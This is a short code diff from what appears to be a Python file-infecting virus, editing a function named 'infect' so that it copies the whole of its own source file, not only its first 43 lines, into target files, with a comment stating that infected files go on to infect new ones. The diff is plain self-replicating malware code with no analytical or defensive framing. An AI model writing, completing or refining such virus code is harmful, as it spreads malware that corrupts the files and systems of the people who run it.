@@ -21,9 +21,8 @@ def infect(filestoinfect):
     # Copy this entire script, resulting in infected files that can infect new ones
     virus = open(os.path.realpath(__file__))
     virusstring = ""
-    for i, line in enumerate(virus):
-        if i >= 0 and i < 43:
-            virusstring += line
+    for _, line in enumerate(virus):
+        virusstring += line
     virus.close()
     for fname in filestoinfect:
         f = open(fname)
